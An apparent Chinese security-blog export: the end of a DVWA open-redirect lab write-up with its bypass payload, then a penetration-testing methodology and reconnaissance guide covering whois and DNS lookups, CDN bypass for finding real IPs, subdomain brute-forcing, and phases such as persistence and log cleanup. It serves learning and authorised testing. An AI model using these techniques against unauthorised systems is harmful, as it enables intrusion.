这里判断redirect参数是否通过get传参，是否存在，如果存在，则直接重定向到url，随后结束脚本执行，否则页面返回500响应。 这里并没有任何过滤，我们可以重定向到任何页面 Medium &lt;?php if (array_key_exists (&quot;redirect&quot;, $_GET) &amp;&amp; $_GET[&#x27;redirect&#x27;] != &quot;&quot;) &#123; if (preg_match (&quot;/http:\\/\\/|https:\\/\\//i&quot;, $_GET[&#x27;redirect&#x27;])) &#123; http_response_code (500); ?&gt; &lt;p&gt;Absolute URLs not allowed.&lt;/p&gt; &lt;?php exit; &#125; else &#123; header (&quot;location: &quot; . $_GET[&#x27;redirect&#x27;]); exit; &#125; &#125; http_response_code (500); ?&gt; &lt;p&gt;Missing redirect target.&lt;/p&gt; &lt;?php exit; ?&gt; 这里限制了redirect参数以http://或者https://开头，也就是不能以绝对的url开头，但是我们可以使用相对的url 这里借用阮一峰老师对相对url与绝对url的解释： URL 分成两种：绝对 URL 和相对 URL。 绝对 URL 指的是，只靠 URL 本身就能确定资源的位置。这意味着，URL 必须带有资源的完整信息，包含协议、主机、路径等部分。前面的例子都是绝对 URL。 相对 URL 指的是，URL 不包含资源位置的全部信息，必须结合当前网页的位置，才能定位资源。比如，当前网页的 URL 是https://www.example.com/path/index.html，该网页上面有一个资源，URL 指向a.html，这个就是相对 URL。因为只知道a.html，并不能定位资源。浏览器假定，a.html与当前网址在同一个子目录下面，从而得到绝对 URL https://www.example.com/path/a.html。 相对 URL 如果以斜杠（/）开头，就表示网站的根目录。否则，必须以当前目录为起点，推算资源的位置。比如，相对 URL /foo/bar.html表示网站根目录的子目录foo，foo/bar.html表示在当前目录的foo子目录。 URL 还可以使用两个特殊简写，表示特定位置。 .：表示当前目录，比如./a.html（当前目录下的a.html文件） ..：表示上级目录，比如../a.html（上级目录下的a.html文件） 这两种简写可以多个连用，比如../../表示上两级目录。 绝对 URL 也可以使用这两个简写，比如www.example.com/./index.html等同于www.example.com/index.html，这时.相当于根目录的当前目录，即根目录本身。 因此这一关我们可以这样构造 High &lt;?php if (array_key_exists (&quot;redirect&quot;, $_GET) &amp;&amp; $_GET[&#x27;redirect&#x27;] != &quot;&quot;) &#123; if (strpos($_GET[&#x27;redirect&#x27;], &quot;info.php&quot;) !== false) &#123; header (&quot;location: &quot; . $_GET[&#x27;redirect&#x27;]); exit; &#125; else &#123; http_response_code (500); ?&gt; &lt;p&gt;You can only redirect to the info page.&lt;/p&gt; &lt;?php exit; &#125; &#125; http_response_code (500); ?&gt; &lt;p&gt;Missing redirect target.&lt;/p&gt; &lt;?php exit; ?&gt; 这里检查redirect中是否含有info.php字符串，如果含有才会正常的去请求重定向，否则返回500。 由代码审计得，在构造参数时是指包含字符串info.php即可 Payload：?redirect=https//www.baidu.com/?已定义参数=info.php 注意：需要参考网页支持的参数来传递info.php。例如 当该网页没有设定a参数的get传参时： GET ?redirect=https//www.baidu.com/?a=info.php 是无效的，因为字符串&quot;info.php&quot;并未传递给合法的参数 Impossible &lt;?php $target = &quot;&quot;; if (array_key_exists (&quot;redirect&quot;, $_GET) &amp;&amp; is_numeric($_GET[&#x27;redirect&#x27;])) &#123; switch (intval ($_GET[&#x27;redirect&#x27;])) &#123; case 1: $target = &quot;info.php?id=1&quot;; break; case 2: $target = &quot;info.php?id=2&quot;; break; case 99: $target = &quot;https://digi.ninja&quot;; break; &#125; if ($target != &quot;&quot;) &#123; header (&quot;location: &quot; . $target); exit; &#125; else &#123; ?&gt; Unknown redirect target. &lt;?php exit; &#125; &#125; ?&gt; Missing redirect target. 这里采用了表名单过滤，并且将redirect参数内容转换为了整数，这意味着redirect对我们来说已经不可控了 0x18 参考文章 [网络安全] DVWA之Open HTTP Redirect 攻击姿势及解题详析合集 绝对 URL 和相对 URL DVWA 入门靶场学习记录","tags":["web渗透"],"categories":["Web渗透靶场"]},{"title":"渗透测试流程&外网打点","path":"/2023/12/31/shen-tou-ce-shi-wai-wang-da-dian/","content":"0x01 前言 终于抽出时间来学习了，看了看st3pby师傅给的资料，对于渗透测试流程不熟悉的我，感觉需要学的挺多的，估计又是一场恶战，话不多说直接开卷！！ 0x02 渗透测试基本流程 这里先学习一下大致测试的框架流程： 大致可分为三个阶段：信息搜集、漏洞发现、漏洞利用。但放到实战中，这三个方面又可以有很多的细节优化，进一步深入明确测试流程，这里主要通过9个阶段来学习一下整个测试流程。 渗透测试一般就是典型的黑盒测试，就是模拟黑客的入侵；还有一种叫白盒渗透，是在了解了一些内部的情况之后再挖掘漏洞。一般性黑盒测试的东西多一点。 2.1 确定目标 范围的确定 测试的范围：我们要知道当前测试的范围是IP、域名、内网和外网、整个网站还是网站的某个功能模块？ 一般来说可能测试的是一个公司或企业的内部网络，针对的大部分是服务器。或者是一个网站或网站群，或者是一些软件应用或者APP，这类的话一般都是获取应用的后台服务器的权限。 规则的确定 我们需要知道我们可以测试到什么程度：是发现漏洞即可，还是要进一步利用漏洞；是否有时间限制、是否可以修改上传、能否提权等等等等，也就是确定问我们可以做什么不可以做什么。这里填充一下文章给的： 目标系统介绍、重点保护对象及特性。 是否允许数据破坏？ 是否允许阻断业务正常运行？ 测试之前是否应当知会相关部门接口人？ 接入方式？外网和内网？ 测试是发现问题就算成功，还是尽可能的发现多的问题？ 渗透过程是否需要考虑社会工程？ 需求的确定 我们需要明确让我们测试的需求具体是什么：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？根据需求和自己技术能力来确定能不能做、能做多少，点到为止。 2.2 分析风险，获得授权 这里的知识就不懂了，没了解过。。。直接cv加自己的浅薄理解了 分析渗透测试过程中可能产生的风险，如大量测试数据的处理、影响正常业务开展、服务器发生异常的应急、数据备份和恢复、测试人力物力成本… 由测试方书写实施方案初稿并提交给客户（or本公司内部领导）进行审核。在审核完成后，从客户（or本公司内部领导）获取对测试方进行书面委托授权书，授权测试方进行渗透测试。（不授权不测试~~~） 2.3 信息搜集 这里一块可以说是奠定了一次渗透测试是否会成功的基础，虽然之前有所总结，但现在也几乎忘了，因此这一块得重点温习一下（令起一部分）。 首先明确一下信息搜集阶段的目的：尽可能多的获取到目标web应用的各种信息。 信息包括：脚本语言类型、服务器类型、目录结构、是否使用开源软件且使用的哪种开源软件、数据库类型、页面所含的超链接、部署应用用到的框架、中间件类型、用到了哪些网络服务（SSH、FTP）、使用的哪种CMS等等还有很多。 而其中搜集利用到的方式为：主动扫描；开放搜索；利用搜索引擎获取后台、未授权页面、敏感url等等 基础信息：IP，网段，域名，端口，旁站、C段 系统信息：操作系统版本--》在之后的提权中才能“对症下药” 应用信息：各端口的应用，例如web应用，邮件应用等 版本信息：所有探测到的版本 服务信息：服务器类型、版本、中间件、数据库、脚本类型、软件类型（微信，Chrome）、用到的网络服务 人员信息：域名注册人员信息，web应用中网站发帖人的id，管理员姓名等 防护信息：试着看能否探测到防护设备 这种信息一般可以先通过部分功能强大的小插件先获取 2.4 漏洞探测（手动&amp;自动） 到了这一阶段就需要利用2.3搜集到的各类信息，尝试找到相应的漏洞进行探测。 探测方法 各类漏扫工具：AWVS、AppScan等等； 结合漏洞去开源漏洞库（exploit-db）等地方去尝试寻找是否是已经公开过的漏洞。 网络漫游找寻漏洞验证POC 平常也需要多关注一些关于网络安全的新闻，掌握漏洞实时消息，说不定日后就不会用到的 简单列举一下常见的软件漏洞： XAMPP提权漏洞 WordPress大量漏洞 PhpStudy漏洞 phpMyAdmin漏洞 IIS低版本解析漏洞 Nginx/Apache解析漏洞 SSH后门漏洞 FTP/RDP等网络服务弱口令漏洞 Rlogin后门漏洞 探测内容 系统漏洞：找寻对方系统是否没有打入相关补丁，幸运地话可能会发现对方操作系统并未及时打补丁，后果就是直接拿下！ Webserver漏洞：Webserver配置问题–也就是中间件漏洞（这一块爆的漏洞还是很多的） Web应用漏洞：Web应用开发问题、还有就是Web开启了其他端口的服务，但却没设置授权访问，或者可以弱口令打入。 各种端口服务：这里主要是针对端口服务的开启，比如21–FTP、8080–这里可能有Apache-tomcat、struct2等等，常被用于代理www服务、7001端口–一般为weblogic服务、22–Linux-SSH远程连接服务、3389–Windows远程桌面连接等等。 通信安全：看看传输过程中的敏感数据是明文的、比如token在cookie的传输、jwt加密所用的key、各类加密盐等等。 2.5 漏洞验证 将上一步发现的有可能可以成功利用的漏洞都验证一遍。结合实际情况，搭建模拟环境进行测试，成功后再在目标中实现，验证发面包括一下内容： 自动化验证：结合自动化扫描工具提供的结果 手工验证：根据公开资源进行验证 试验验证：自己搭建模拟环境进行验证 登录猜解：有时可以尝试猜解一下登陆口的账号密码等信息，可关注前端js接口。 业务漏洞验证：如发现业务漏洞，要进行验证 公开资源的利用exploit-db/wooyun/渗透代码网站通用、缺省口令厂商的漏洞警告等 2.6 信息分析 这一步是为下一步实施具体渗透做准备。 精准攻击：准备好上一步探测到的漏洞exp（漏洞利用），用来对某个模块进行精准攻击 绕过防御机制：是否有防火墙等设备，如何绕过 定制攻击路径：最佳工具路径，根据薄弱点入口，搞清楚内网权限位置，确定最终目标 绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀） 攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等 2.7 利用漏洞获取数据 实施攻击：根据前几步的结果，进行攻击 获取内部信息：基础设施（网络连接，vpn，路由，拓扑等） 进一步渗透：内网入侵，敏感目标 持续性存在：一般对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等 清理痕迹：清理相关日志（访问，操作），上传文件等 2.8 信息整理 整理渗透工具：整理渗透过程中用到的代码，poc，exp等 整理收集信息：整理渗透过程中收集到的一切信息 整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息 目的：为了最后形成报告，形成测试结果使用。 2.9 形成报告 按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告 补充介绍：要对漏洞成因，验证过程和带来危害进行分析 修补建议：要对所有产生的问题提出合理高效安全的解决办法 0x03 信息搜集 这里就单独着重学习一下信息搜集的各类奇淫巧技吧。 3.1 信息搜集的分类 1、主动式信息搜集（可获取到的信息较多，但易被目标发现） 2、通过直接发起与被测目标网络之间的互动来获取相关信息，如通过Nmap扫描目标系统。 3、被动式信息搜集（搜集到的信息较少，但不易被发现） 4、通过第三方服务来获取目标网络相关信息。如通过搜索引擎方式来搜集信息。 3.2 搜集什么信息 1、whois信息（微步） 2、网站架构 3、dns信息（通过查询dns我们可以检测是否存在dns域传送漏洞） 4、子域名搜集 5、敏感目录及敏感信息、源码泄露（搜索引擎+工具） 6、脆弱系统（网络空间） 7、旁站查询 8、C端查询 9、指纹信息 10、端口服务 11、备案信息 12、真实ip 13、探测waf 14、社工（朋友圈、微博、qq空间、求职、交易等社交平台） 15、企业信息（天眼查、企业信用信息公示系统、工业和信息化部ICP/IP地址/域名信息备案管理系统） 3.3 目标确认 域名注册信息（主域名查询） 通过如下步骤确认目标所有者信息： Whois 目标域名/主机名：whois http://example.com 解析目标域名/主机名的IP地址：dig +short http://example.com 获取域名的详细解析过程：dig +trace http://example.com 后续用于字典制作和进一步收集目标信息的基础 whois查询 whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。 whois信息可以获取关键注册人的信息，包括注册商、联系人、联系邮箱、联系电话、创建时间等,可以进行邮箱反查域名，爆破邮箱，社工，域名劫持等等。 注：不同域名后缀的whois信息需要到不同的whois数据库查询 主要的实现原理： 1.根据域名从根服务器获取域名所在whois服务器 2.再根据域名从域名所在whois服务器获取域名信息 即 domain + rootServer =&gt; targetServer domain + targetServer =&gt; domainInfo 当然，如果知道了域名信息所在服务器，可以跳过第一步，直接查询域名信息 下面实操一手。 方法一：根服务器 通过原始网页查询：首先根据域名从whois的根服务器获取域名所在的whois服务器：https://www.iana.org/whois 或者根据域名后缀在数据库中查询对应whois服务器地址：https://www.iana.org/domains/root/db 这里我们就以.cn为例，查询一下，如下图可以看到该域名对应的whois服务器 接下来就是根据得到的whois服务器获取域名信息，结果如下，但这里只能查询一级域名，不能携带www之类的前缀 这里也能看到如果域名后缀不对应，也是查询不到的 方法二：第三方服务查询 https://whois.aliyun.com/ https://whois.cloud.tencent.com/ https://who.is/ https://www.whois.com/whois/ https://whois.chinaz.com/ https://whois.aizhan.com/ 下方有对应的英文详细信息： 体验下来感觉https://www.whois.com/whois更好一点，信息挺完善的。不过本质来似乎都是来自whois根服务器查询到的信息，整合了一下而已。而阿里云和腾讯云的感觉用于查国内就行了，最后一个站长工具的whois不太完善，但直接提供了反查功能，感觉还算不错（感觉是查国内挺效率的工具了） 这里还有爱站 这里最全面的感觉就是微步社区了 可以看到结果很全面，就是想要查询一些隐私还得氪金~~~ 方法三：whois命令 就是用whois命令进行查询，这个命令在Linux与Windows下都可安装，这里用Linux演示了，至于安装办法就不赘述了 同样的如下图，二级域名就查询不到了 这里需要注意的是国际域名可以设置隐私保护，但像国内.cn等域名是不可以设置隐私保护的。 方法四：中文域名 这里看了几篇文章，还有用代码去实现的（自我感觉没太必要），这里的代码可以自己写，也可以直接用第三方库 具体的感兴趣参考：一文搞定：whois数据库查询域名信息（WHOIS） 这里介绍这篇文章提到的中文域名查询。。。 他这里说：通过接口直接查询中文域名，会提示没有查询结果。这时候需要将中文域名进行编码 在线编码：http://tools.jb51.net/punycode/index.php 其实，中文后缀的域名可以不编码，主要是中英结合的域名, 比如 http://中万.cn/ 从浏览器直接复制过来是http://xn–chq7c.cn/ 这是一种叫做：Punycode的编码方式 print(\"中万\".encode('punycode').decode()) # chq7c 12 然后加上前缀xn--，就和上面的结果一致了 xn--chq7c 可以看到还是可以查询到的，不过这里如果进入其对应的refer服务器中就查询错误（格式不正确） 不过这里竟然可以直接中文域名查询！！当然whois根服务器也可以 这里附上一个whois查询信息的解释： 01 whois：是查询命令 02 qqpk.cn：是要查询的域名 03 Domain.name：域名 04 ROID：是Register Object ID号，相当于注册对象的一个身份证号码 05 Domain Status: CLIENT TRANSFER PROHIBITED 【也就是客户端禁止转移，该状态由注册商设置，域名可以更新（域名信息修改）、续费、删除，需要指派至少一台域名服务器则可以正常使用。】 06 Registrant：域名注册人的姓名 07 Registrant Contact Email：注册人的联系邮箱 08 Sponsoring Registrar：注册商 【他们进行抢注域名，然后进行high价转让的公司】 09 Name Server：也就是DNS域名解析服务器，它在互联网的作用是把域名转换成为网络可以识别的IP地址 10 Registration Time：注册该域名的时间 11 Expiration Time：该域名到期时间 12 DNSSEC：unsigne 【DNSSEC=Domain Name System Security Extensions (DNSSEC)，DNS安全扩展，是由IETF提供的一系列DNS安全认证的机制（可参考RFC2535）。它提供了一种来源鉴定和数据完整性的扩展，但不去保障可用性、加密性和证实域名不存在。】 【Unsigned：未设置、未部署】 dig查询 dig（domain information group）是常用的域名查询工具，可以从DNS域名服务器查询主机地址信息，获取到详细的域名信息。这个命令是Bind的一部分，本身并没有在Windows和Linux系统中集成，所以如果我们想要使用该命令就需要先下载相应的软件包。–至于下载方式这里就不说了 这里补充一下对于资源记录(RR)的四个元组的知识： A记录 IP地址记录,记录一个域名对应的IP地址 AAAA记录 IPv6地址记录，记录一个域名对应的IPv6地址 CNAME记录 别名记录，记录一个主机的别名 MX记录 电子邮件交换记录，记录一个邮件域名对应的IP地址，比如my[at]lijiejie.com 后面的部分lijiejie.com，邮件服务器对应的IP地址 NS记录 域名服务器记录 ,记录该域名由哪台域名服务器解析 PTR记录 反向记录，也即从IP地址到域名的一条记录 TXT记录 记录域名的相关文本信息 SOA记录 start of anthorization 开始授权，是一种比较难以理解的记录值，一般二级域名才会有 简单使用：dig www.baidu.com 对一些字段的解释： 第一二行：输出了有关dig的版本信息，和全局设置选项：+cmd，以及输入参数信息 Got answer：输出了从DNS返回的技术信息，比较重要的是 status，如果 status 的值为 NOERROR ，则说明本次查询成功。这段信息可以用选项 [no]comments 来控制是否显示，但是小心禁止掉comments也可能关闭一些其它的选项。 QUESTION SECTION：查询字段，显示了我们查询的域名以及查询的服务，A代表的是查询A记录，即主机查询 ANSWER SECTION：回答字段这里的结果表示：要查询www.baidu.com先查询CNAME记录，对www.a.shifen.com进行访问，当我们访问www.a.shifen.com后，该主机让我们访问110.242.68.3，我们访问110.242.68.3后，这个ip的主机会告诉我们www.baidu.com的IP是110.242.68.4 这部分显示了请求所花的时间，dns服务器，当前时间，以及查询信息的大小 还有一个值得记录的是-x选项，说是根据IP反查域名（另外每个命令后面添加+short可以简化输出信息） dig -x 183.84.6.134\t# 访问PTR记录，查询该IP地址所对应的主机名，DNS解析是用域名查IP，而PTR记录是IP查域名 不过这里始终没看出来域名在哪里。。。。还有一个+trace命令可以看到域名解析详细过程 ICP备案查询 ICP备案是指网站在信息产业部提交网站信息进行官方认可。对国内各大小网站(包括企业及个人站点)的严格审查工作，对于没有合法备案的非经营性网站或没有取得ICP许可证的经营性网站，根据网站性质，将予以罚款，严重的关闭网站，以此规范网络安全，打击一切利用网络资源进行不法活动的犯罪行为。也就是说，只要是盈利为目的的网站，都要进行ICP备案，否则会受到相应的处罚。 国内使用国内服务器的网站，都必须要先办理ICP备案后才可以上线。 通过查询目标企业的备案信息，可直接获取到目标企业注册了哪些域名，从而增加可渗透的目标范围。 推荐使用官方网站ICP/IP地址/域名信息备案管理系统 ——支持使用单位名称、域名和备案号进行查询 站长工具 爱站网 站长seo综合查询工具-爱站网 证书查询 SSL证书是一种遵守SSL协议的服务器数字证书，由受信任的根证书颁发机构颁发。 SSL证书采用SSL协议进行通信，SSL证书部署到服务器后，服务器端的访问将启用HTTPS协议。 您的网站将会通过HTTPS加密协议来传输数据，可帮助服务器端和客户端之间建立加密链接，从而保证数据传输的安全。 通过查询共用SSL证书的网站，可以找到相关的其他域名。 第一种可以浏览器直接查看，如下图，点击更多信息 接着点击上图的查看证书即可 第二种是利用在线网站查询： crt.sh 第三种是通过网络空间搜索引擎 可查询fofa语法手册： 语法 说明 cert=\"baidu\" 搜索证书(https或者imaps等)中带有baidu的资产。 cert.subject=\"Oracle Corporation\" 搜索证书持有者是Oracle Corporation的资产 cert.issuer=\"DigiCert\" 搜索证书颁发者为DigiCert Inc的资产 cert.is_valid=true 验证证书是否有效，true有效，false无效 DNS共享记录查询 DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。 此处通过查询共享DNS服务器的主机来获取到相关的域名；需要注意的是，如果是公开的DNS服务器，那么查询的效果将会特别差。 首先查询目标是否存在自建的NS服务器 将获取到的NS服务器带入 https://hackertarget.com/find-shared-dns-servers/ 进行查询 此处查询的结果并不全是属于目标范围，需要进一步的确认和观察。 IP反查 目标多个域名可能绑定在同一IP上，通过IP反查一定情况下可获取到其他的域名信息。 同IP网站查询，同服务器网站查询 - 站长工具 Online investigation tool - Reverse IP, NS, MX, WHOIS and Search Tools 输入相关的域名或IP地址即可查询。 搜索引擎搜索IP反查域名即可，但有时候效果并不理想，很多情况查不到 推荐使用平台：https://securitytrails.com/dns-trails fofa、zoomeye、hunter、quake等，最推荐的还是hunter，效果最好，能查到很多东西 https://hunter.qianxin.com/list?search=ip%3D\"220.181.38.251\" 股权信息 通过查询股权信息，或者股权穿透图，寻找子公司和孙公司等，一般对外投资超过50%或者有行政权限的都可以算目标 天眼查：https://www.tianyancha.com/ 企查查：https://www.qcc.com/ 如查询字节跳动 通过查询子公司，再查询子公司对应的产品，可以大范围的扩大攻击面 工具推荐 https://github.com/wgpsec/ENScan_GO https://github.com/i11us0ry/AScan Hackerone 一些在hackerone上进行众测的厂商，会把自己的测试范围列举出来，其中就包含有大量的域名，因此通过hackerone来完善资产收集也是一个不错的方法。 以阿里为例：https://hackerone.com/alibaba?type=team&amp;view_policy=true Google Google直接搜索里面的一些关键内容来查询，比如公司名、备案、引用的特殊js等 还是以阿里为例（别人的成果图） intext:浙ICP备09048685号 intext:11040102700068 -www 国家企业信用信息公示系统 https://shiming.gsxt.gov.cn/corp-query-search-1.html 获取真实IP 为了保证网络的稳定和快速传输，网站服务商会在网络的不同位置设置节点服务器，通过 CDN（Content Delivery Network，内容分发网络）技术，将网络请求分发到最优的节点服务器上面。如果网站开启了 CDN 加速，就无法通过网站的域名信息获取真实的 IP，要对目标的 IP 资源进行收集，就要绕过 CDN 查询到其真实的 IP 信息。 一个小tip：浏览器切换手机模式，可能是真实ip，公众号、小程序中的资产也可能对应真实ip。 如何判断是否有CDN 在对目标 IP 信息收集之前，首先要判断目标网站是否开启了 CDN，一般通过不同地方的主机 ping 域名和 nslookup 域名解析两种方法，通过查看返回的 IP 是否是多个的方式来判断网站是否开启了 CDN，如果返回的 IP 信息是多个不同的 IP，那就有可能使用了 CDN 技术。 方法一：多地ping 使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有： 可以到有多个IP，一般这种方法要根据多个网站都进行尝试一下，才能更好的确定，不过这里能用的我知道的只有两个 http://ping.chinaz.com/、http://ping.aizhan.com/而且后者还似乎崩了，查询没反应 又去谷歌找了一番，无果，感觉有需要的话需要多翻翻一些网站了。 方法二：nslookup 试用nslookup进行检测，如果返回域名解析对应多个IP，那么多半是试用了CDN. nslookup http://example.com 这里看到一个是有多个IP地址，一个是name的值直接就是cdn.net什么的，这很明显就是有CDN了 方法三：在线工具 在线工具查看是否存在CDN，可以参考以下站点: http://www.cdnplanet.com/tools/cdnfinder http://www.ipip.net/ip.html 这里推荐第二个站点 绕过CDN 查询历史DNS记录 查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有 https://x.threatbook.cn/ https://censys.io/ipv4?q=baidu.com https://github.com/projectdiscovery/cdncheck –未仔细查看 https://viewdns.info/iphistory/ https://securitytrails.com/ –需要企业邮箱注册，不过很全 SecurityTrails（前身为 DNS Trails）拥有大约3.5万亿DNS记录，3亿whois记录，8亿SSL证书记录以及超过4.5亿子域的记录数据。自2008年以来，网站每天都收集和更新海量数据。 DNS 记录： IP历史 子域名： Complete DNS（https://completedns.com/）Complete DNS 拥有超过 22 亿个DNS变更记录，提供API，支持同时进行多域名/IP查询。 WhoISrequest （https://whoisrequest.com/） WhoISrequest 这个网站自2002年以来一直在跟踪和记录DNS历史变更，数据底蕴很足。 不过这里查了半天没查到什么信息，而且这个网站似乎对于dns历史记录用的是上面的网站的api Whoxy（https://www.whoxy.com/） Whoxy 拥有爬取超过 3.65亿个子域数据，该网站 API 调用非常方便，以 XML 和 JSON 格式返回数据。 还有很多网站，这里就不一一介绍了，详细可浏览参考文章，这里汇总一下 http://www.cdnplanet.com/tools/cdnfinder http://www.ipip.net/ip.html https://x.threatbook.cn/ https://censys.io/ipv4?q=baidu.com https://github.com/projectdiscovery/cdncheck https://viewdns.info/iphistory/ https://securitytrails.com/ https://completedns.com/ https://whoisrequest.com/ https://www.whoxy.com/ https://dnsdb.io/ https://reverse-ip.whoisxmlapi.com/ 使用国外主机请求域名 部分国内的 CDN 加速服务商只对国内的线路做了 CDN 加速，但是国外的线路没有做加速，这样就可以通过国外的主机来探测真实的 IP 信息。 探测的方式也有两种，可以利用已有的国外主机直接进行探测；如果没有国外主机，可以利用公开的多地 ping 服务（多地 ping 服务有国外的探测节点），可以利用国外的探测节点返回的信息来判断真实的 IP 信息。 网站信息泄露漏洞 服务器日志文件 探针文件，例如 phpinfo 网站备份压缩文件 .DS_Store .hg .git SVN Web.xml 字典非常重要，往往疏忽的点就在一台边缘服务器。 小tip：phpinfo 页面中有一个 SERVER_ADDR 字段会显示该主机真实 IP。 查询子域名 这里注意的就是子域名、C段以及旁站（同IP网站） 由于 CDN 加速需要支付一定的费用，很多网站只对主站做了 CDN 加速，子域名没有做 CDN 加速，子域名可能跟主站在同一个服务器或者同一个 C 段网络中，可以通过子域名探测的方式，收集目标的子域名信息，通过查询子域名的 IP 信息来辅助判断主站的真实 IP 信息。 ———具体的方法在下面叙述 邮件信息 一般大型网站自己部署架设的邮件服务器如果向外部用户发送邮件的话，如果中间未经任何数据处理和防护措施，那么邮件头部的源码中会包含此邮件服务器的真实 IP 地址。常见的邮件触发点有： RSS 订阅 邮箱注册、激活处 邮箱找回密码处 产品更新的邮件推送 某业务执行后发送的邮件通知 员工邮箱、邮件管理平台等入口处的忘记密码 另外这里还有一个奇淫技巧，通过发送邮件给一个不存在的邮箱地址，比如 000xxx@domain.com ，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。 生产上多关注这些点，一个不成功继续测试下一个邮件触发点，很多大型网站的邮件服务器不止一台，并不是所有都做了防护处理，细节决定成败。 目标网站 APP 应用 如果目标网站有自己的 App，可以尝试利用 Burp Suite 等流量抓包工具抓取 App 的请求，从里面可能会找到目标的真实 IP。 子域名查询 这里除了常见的网络空间如fofa、shodan、zoomeye、censys等，就是一些强大脚本工具了。这里熟悉几个常见的 SubDomainsBrute 项目地址：https://github.com/lijiejie/subDomainsBrute SubDomainsBrute 是通过纯 DNS 爆破来寻找子域名，为了最大提升脚本效率，采用协程+多进程的方式进行爆破。Python 3.5 以上需要安装 aiodns 库进行异步查询，python 2 需要安装 dnspython 库和 gevent 协程库。 python subDomainsBrute.py baidu.com 且在最近更新之后是支持扫描泛解析域名的，使用 -w 参数。——这里简单了解了一下域名泛解析。 简单来说就是DNS的泛域名解析也可以理解为带通配符的解析记录，带通配符的解析记录是用来为不存在的子域提供解析请求响应的方法。 例如存在一个example.com，如果我们设置通配符记录：*.example.com，则对其不存在的所有子域，比如abcd.example.com、xxx.example.com（这些都是不存在的子域），则如果我们在对这些子域进行请求的时候，都会自动指向example.com。 因此基于上述原理，如果我们的目标域名设置了这样的泛解析，那我们可以凭借强大的字典对其任意子域进行请求，看最终返回的ip是否与其主域IP一致，如果一致那说明该子域不存在；但如果不一致，说明该子域是存在的。 当然如果目标域名没有设置泛解析，那我们在对其子域进行请求的时候，如果返回了与主域IP地址不同的情况，则直接说明该子域存在 我们针对一个泛解析的域名进行爆破，subDomainsBrute 会提示 any-sub 错误，之后使用 -w 参数开启泛解析强制爆破 ESD 项目地址：https://github.com/FeeiCN/ESD –具体的就不介绍了，看一下使用效果即可，这里扫描单个域名看看 就是速度有点慢 # 扫描单个域名 esd -d qq.com # debug模式扫描单个域名 esd=debug esd -d qq.com # 扫描多个域名（英文逗号分隔） esd --domain qq.com,tencent.com # 扫描单个域名且过滤子域名中单个特定响应内容 esd --domain mogujie.com --filter 搜本店 # 扫描单个域名且过滤子域名中多个特定响应内容 esd --domain mogujie.com --filter 搜本店,收藏店铺 # 扫描文件（文件中每行一个域名） esd --file targets.txt # 跳过相似度对比（开启这个选项会把所有泛解析的域名都过滤掉） esd --domain qq.com --skip-rsc # 平均分割字典，加快爆破 esd --domain qq.com --split 1/4 # 使用DNS域传送漏洞获取子域名 esd --domain qq.com --dns-transfer # 使用HTTPS证书透明度获取子域名 esd --domain qq.com --ca-info Layer 子域名挖掘机 项目地址：https://hub.fastgit.org/euphrat1ca/LayerDomainFinder/releases/tag/3 Xray 项目地址：https://github.com/chaitin/xray xray 是一款强大的安全评估工具，一款自动化扫描器，我们可以用其自带的 subdomain 子域名发掘功能来针对性探测： subdomain 功能支持暴力破解模式和非暴力模式，可以只探测 web 服务或者只探测 ip 可解析的子域，另外支持 webhook 数据传递，作为插件端或者分发消息的接收端来使用都非常方便快捷。 Bypass-firewalls-by-DNS-history 项目地址：https://github.com/vincentcox/bypass-firewalls-by-DNS-history Bypass-firewalls-by-DNS-history 是一款集成全自动化的探测工具，通过探测 DNS 历史记录，搜索旧的 DNS A Record，收集子域，并检查服务器是否对该域名进行答复。 另外它还基于源服务器和防火墙在HTML响应中的相似性阈值来判断。 OneForAll 项目地址：https://github.com/shmilylty/OneForAll 搜索引擎发现子域名 使用搜索引擎语法，如Google 或者百度等 Google-》site:xxx.com Fofa-》domain=\"xxx.com\" 第三方聚合服务发现子域名 第三方聚合平台 Netcraft、Virustotal、ThreatCrowd、DNSdumpster 和 ReverseDNS 等获取子域信息。 通过 SSL 证书 证书颁发机构 (CA) 必须将他们发布的每个 SSL/TLS 证书发布到公共日志中，SSL/TLS 证书通常包含域名、子域名和电子邮件地址。因此可以利用 SSL/TLS 证书来发现目标站点的真实 IP 地址。 CDN 运营商在给服务器提供保护的同时，也会与其服务器进行加密通信（ssl），这时当服务器的 443 端口接入域名时也会在 443 端口暴露其证书，我们通过证书比对便可发现网站的真实 IP 地址。 利用 Censys 引擎（https://censys.io/） Censys 搜索引擎能够扫描整个互联网，每天都会扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，可以利用 Censys 进行全网方面的 SSL 证书搜索，找到匹配的真实 IP 。 可以看到，当我们针对一个互联网 IP 地址进行搜索时，是有匹配到证书 sha1 签名的 同理，我们根据域名指纹搜索 SSL 证书指纹，然后再反查 IP 就可以了。 首先针对目标域名，选择 Certificates 证书搜索，结果出来一堆 有效 的证书和 无效 的证书： 我们在搜索的时候可以使用语法来先检索有效证书，如果无果再回去查看无效证书 使用命令行 通过 openssl 和 curl 等常见的基础命令，也同样可以达到反查 SSL 证书的效果。 openssl：附上成果图 openssl s_client -connect ip:443 | grep subject curl： curl -v https://123.123.123.123 | grep 'subject' 使用工具和脚本 通过自己写工具脚本，集成前面的1、2两点，完全可以做到一个简易版的 SSL 全网证书爬取，也可以利用现有的一些脚本工具和网站，省的我们自己费力了。 例如 CloudFlair ，项目地址：https://github.com/christophetd/CloudFlair 脚本兼容 python2.7 和 3.5，需要配置 Censys 